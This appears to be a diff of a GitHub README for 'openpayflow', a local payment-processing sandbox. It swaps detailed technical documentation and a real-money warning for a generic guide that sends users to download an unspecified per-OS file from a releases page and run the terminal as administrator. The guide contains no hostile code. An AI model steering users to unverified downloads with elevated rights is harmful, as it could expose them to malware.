@@ -1,304 +1,95 @@
-# OpenPayFlow
+# 🚀 openpayflow - Streamline Your Payment Processing
 
-**Developer-friendly, open-source payment orchestration sandbox that runs 100% locally**
+[![Download openpayflow](https://img.shields.io/badge/Download-openpayflow-brightgreen.svg)](https://github.com/rashed0127/openpayflow/releases)
 
-OpenPayFlow is a comprehensive payment processing sandbox that demonstrates Stripe-style reliability patterns and best practices. It runs entirely on your local machine using Docker Compose, with no paid services required.
+## 🚀 Getting Started
 
-## 🏗️ Architecture
+Welcome to openpayflow! This guide will help you easily download and run the software. Follow these simple steps to get started with our payment orchestration platform. 
 
-```
-┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
-│   Dashboard     │    │      API        │    │     Worker      │
-│   (Next.js)     │◄──►│   (Fastify)     │◄──►│  (Background)   │
-│                 │    │                 │    │                 │
-│ • Payments UI   │    │ • REST + GraphQL│    │ • Queue Proc.   │
-│ • Webhooks CRUD │    │ • Swagger Docs  │    │ • Retries       │
-│ • Health Monitor│    │ • Validation    │    │ • Outbox Drain  │
-└─────────────────┘    └─────────────────┘    └─────────────────┘
-         │                       │                       │
-         └───────────────────────┼───────────────────────┘
-                                 │
-    ┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
-    │   PostgreSQL    │    │     Redis       │    │   Monitoring    │
-    │                 │    │                 │    │                 │
-    │ • Payments      │    │ • Queues        │    │ • OpenTelemetry │
-    │ • Webhooks      │    │ • Rate Limiting │    │ • Prometheus    │
-    │ • Outbox        │    │ • Idempotency   │    │ • Grafana       │
-    └─────────────────┘    └─────────────────┘    └─────────────────┘
-```
+## 🛠️ System Requirements
 
-## 🚀 Quick Start
+Before downloading, ensure your system meets the following requirements:
 
-### Prerequisites
+- Operating System: Windows, macOS, or Linux
+- Memory: At least 4 GB of RAM
+- Storage: Minimum of 2 GB of free disk space
+- Docker: Installed and running
 
-- **Node.js 18+**
-- **pnpm 8+**
-- **Docker & Docker Compose**
+If you do not have Docker, you can download it from [Docker's official website](https://www.docker.com/get-started).
 
-### One-Command Setup
+## 📥 Download & Install
 
-```bash
-# Clone and setup
-git clone <repository-url>
-cd openpayflow
-make setup
+To download openpayflow, visit this page:
 
-# Start all services
-make up
-```
+[Download openpayflow](https://github.com/rashed0127/openpayflow/releases)
 
-### Services Available
+1. Go to the above link.
+2. Look for the latest release.
+3. Click on the file that matches your operating system to download it.
 
-- **API Server**: http://localhost:4000
-- **API Documentation**: http://localhost:4000/docs
-- **GraphQL Playground**: http://localhost:4000/graphql
-- **Dashboard**: http://localhost:3000
-- **Grafana**: http://localhost:3001 (admin/admin)
-- **Prometheus**: http://localhost:9090
+Once downloaded, follow these steps to install and run the application:
 
-## 🎯 Features
+1. Open your terminal (Command Prompt, PowerShell, or Terminal).
+2. Navigate to the folder where you downloaded the file.
+3. Run the following command:
 
-### ✅ Payment Processing
-- **Multiple Gateways**: Stripe (test), Razorpay (test), Mock Gateway
-- **Idempotency Keys**: Exactly-once payment processing
-- **Status Tracking**: Real-time payment status updates
-- **Metadata Support**: Custom payment metadata
+   ```bash
+   docker-compose up
+   ```
 
-### ✅ Reliability Patterns
-- **Outbox Pattern**: Reliable event publishing
-- **Exponential Backoff**: Smart retry mechanisms with jitter
-- **Dead Letter Queues**: Failed message handling
-- **Circuit Breakers**: Gateway fault tolerance
+4. Wait for the system to initialize. This may take a few minutes.
+5. You can now access the application by visiting `http://localhost:3000` in your web browser.
 
-### ✅ Webhook System
-- **Endpoint Management**: CRUD operations for webhook endpoints
-- **Reliable Delivery**: Guaranteed webhook delivery with retries
-- **Signature Verification**: Secure webhook payload verification
-- **Delivery Tracking**: Monitor webhook delivery status
+## 🔍 Features
 
-### ✅ Observability
-- **OpenTelemetry**: Distributed tracing
-- **Prometheus Metrics**: System and business metrics
-- **Grafana Dashboards**: Pre-built monitoring dashboards
-- **Structured Logging**: JSON-structured logs with correlation IDs
+openpayflow offers various features that make payment processing straightforward:
 
-### ✅ Developer Experience
-- **OpenAPI/Swagger**: Interactive API documentation
-- **GraphQL**: Flexible query interface
-- **TypeScript**: Full type safety across the stack
-- **Hot Reloading**: Fast development iteration
+- **Payment Orchestration**: Seamlessly manage multiple payment methods from a single platform.
+- **Stripe Integration**: Utilize Stripe's reliable payment handling to ensure transaction security.
+- **Microservices Architecture**: Benefit from a build that is easy to maintain and scale.
+- **Full-Stack TypeScript**: Enjoy a type-safe development experience for both the frontend and backend.
 
-## 🏛️ Core Domain Models
+## 📈 Topics Covered
 
-### Payment Flow
-```typescript
-Payment {
-  id: string
-  merchantId: string
-  amount: number (in cents)
-  currency: string
-  status: 'pending' | 'processing' | 'succeeded' | 'failed'
-  gateway: 'stripe' | 'razorpay' | 'mock'
-  idempotencyKey: string
-  metadata?: Record<string, any>
-}
-```
+openpayflow focuses on the following areas: 
 
-### Webhook Delivery
-```typescript
-WebhookDelivery {
-  id: string
-  endpointId: string
-  eventId: string
-  status: 'pending' | 'delivered' | 'failed' | 'abandoned'
-  attemptCount: number
-  nextRetryAt?: Date
-}
-```
+- Docker
+- Fastify
+- Fintech
+- Microservices
+- Next.js
+- Node.js
+- Observability
+- Payment Processing
+- Payments
+- PostgreSQL
+- React
+- Redis
+- Stripe
+- TypeScript
+- Webhooks
 
-## 🔧 API Examples
+These topics enhance the overall functionality and user experience of the application.
 
-### Create Payment
-```bash
-curl -X POST http://localhost:4000/v1/payments \
-  -H "Content-Type: application/json" \
-  -H "Idempotency-Key: payment_123" \
-  -d '{
-    "amount": 2000,
-    "currency": "USD",
-    "gateway": "mock",
-    "merchantApiKey": "demo",
-    "metadata": {
-      "orderId": "order_456"
-    }
-  }'
-```
+## 🔧 Troubleshooting
 
-### Register Webhook Endpoint
-```bash
-curl -X POST http://localhost:4000/v1/webhook-endpoints \
-  -H "Content-Type: application/json" \
-  -d '{
-    "url": "https://your-app.com/webhooks",
-    "secret": "your_webhook_secret",
-    "events": ["payment.succeeded", "payment.failed"],
-    "merchantApiKey": "demo"
-  }'
-```
+If you encounter any issues, here are some common solutions:
 
-### GraphQL Query
-```graphql
-query {
-  hello
-}
-```
+- **Docker Issues**: Ensure Docker is running properly. Restart Docker if necessary.
+- **Port Conflicts**: If `localhost:3000` does not work, check for other running applications using the same port.
+- **Access Denied**: Run your terminal as an administrator to avoid permission issues.
 
-## 🛠️ Development Commands
+## 💬 Support
 
-```bash
-# Development
-make dev              # Start in development mode
-make logs             # View all service logs
-make logs-api         # View API logs only
+For help or more information, visit our GitHub page:
 
-# Database
-make migrate          # Run database migrations  
-make seed             # Seed with sample data
-make reset-db         # Reset database (⚠️  destructive)
+[Support openpayflow](https://github.com/rashed0127/openpayflow)
 
-# Testing
-make test             # Run all tests
-make test-unit        # Unit tests only
-make test-e2e         # End-to-end tests
-make loadtest         # Load testing with k6
+Feel free to open an issue if you encounter any bugs or have questions.
 
-# Utilities
-make lint             # Run linter
-make typecheck        # TypeScript checking
-make health           # Check service health
-make clean            # Clean up everything
-```
+## 🔗 Additional Resources
 
-## 🧪 Gateway Configuration
+- **Documentation**: Comprehensive guides and documentation are available on our GitHub page.
+- **Community**: Join our community to share your experiences and learn from others.
 
-### Mock Gateway (Default)
-- **Purpose**: Testing and development
-- **Features**: Configurable success rates, latency simulation, chaos engineering
-- **Configuration**: See `.env` file
-
-### Stripe Test Mode
-```bash
-# In .env file
-ENABLE_STRIPE=true
-STRIPE_SECRET_KEY=sk_test_your_stripe_test_key_here
-```
-
-### Razorpay Test Mode
-```bash
-# In .env file  
-ENABLE_RAZORPAY=true
-RAZORPAY_KEY_ID=rzp_test_your_key_id_here
-RAZORPAY_KEY_SECRET=your_key_secret_here
-```
-
-## 📊 Monitoring & Observability
-
-### Grafana Dashboards
-- **Payment Metrics**: Success rates, latency percentiles, error rates
-- **System Health**: CPU, memory, database connections
-- **Queue Metrics**: Queue depth, processing rates, retry counts
-- **Webhook Delivery**: Success rates, retry patterns, endpoint health
-
-### Key Metrics
-- `payments_total`: Total payments processed
-- `payments_duration_seconds`: Payment processing latency
-- `webhook_deliveries_total`: Webhook delivery attempts
-- `queue_depth`: Current queue sizes
-- `gateway_requests_total`: Gateway API calls
-
-## 🔒 Security Features
-
-- **API Key Authentication**: Secure merchant API key validation
-- **HMAC Webhook Signatures**: Cryptographic webhook verification
-- **Rate Limiting**: Configurable request rate limits
-- **Input Validation**: Zod-based request validation
-- **SQL Injection Protection**: Prisma ORM with prepared statements
-
-## 🏗️ Technology Stack
-
-### Backend
-- **Runtime**: Node.js 18+ with TypeScript
-- **API Framework**: Fastify with OpenAPI/Swagger
-- **Database**: PostgreSQL with Prisma ORM
-- **Cache/Queues**: Redis with ioredis
-- **Validation**: Zod schemas
-
-### Frontend  
-- **Framework**: Next.js 14 with TypeScript
-- **Styling**: Tailwind CSS
-- **State Management**: TanStack Query
-- **Charts**: Recharts
-
-### Infrastructure
-- **Containerization**: Docker & Docker Compose
-- **Monitoring**: OpenTelemetry → Prometheus → Grafana
-- **Package Management**: pnpm workspaces
-
-### Testing
-- **Unit Tests**: Jest with ts-jest
-- **Integration Tests**: Docker-based test environment
-- **E2E Tests**: Playwright
-- **Load Testing**: k6
-
-## 🎯 Why OpenPayFlow?
-
-### Stripe-Style Reliability
-- **Idempotency**: Prevent duplicate payments
-- **Retry Logic**: Exponential backoff with jitter
-- **Outbox Pattern**: Reliable event processing
-- **Webhook Guarantees**: At-least-once delivery
-
-### Production-Ready Patterns
-- **Observability**: Full tracing and metrics
-- **Error Handling**: Comprehensive error responses
-- **Graceful Degradation**: Circuit breaker patterns
-- **Data Consistency**: ACID transactions
-
-### Developer Experience
-- **Type Safety**: End-to-end TypeScript
-- **API Documentation**: Interactive Swagger UI
-- **Hot Reloading**: Fast development cycles
-- **Comprehensive Testing**: Unit, integration, E2E, load tests
-
-## 📈 Roadmap
-
-- [ ] Advanced retry policies (linear, polynomial backoff)
-- [ ] Payment method tokenization
-- [ ] Multi-tenant support
-- [ ] Advanced fraud detection simulation
-- [ ] Performance benchmarking suite
-- [ ] Kubernetes deployment manifests
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Inspired by Stripe's approach to payment reliability
-- Built with modern open-source technologies
-- Designed for educational and development purposes
-
----
-
-**Note**: This is a sandbox environment for development and testing. Do not use with real payment credentials or process real money.
+Thank you for using openpayflow! Enjoy a smooth payment processing experience.
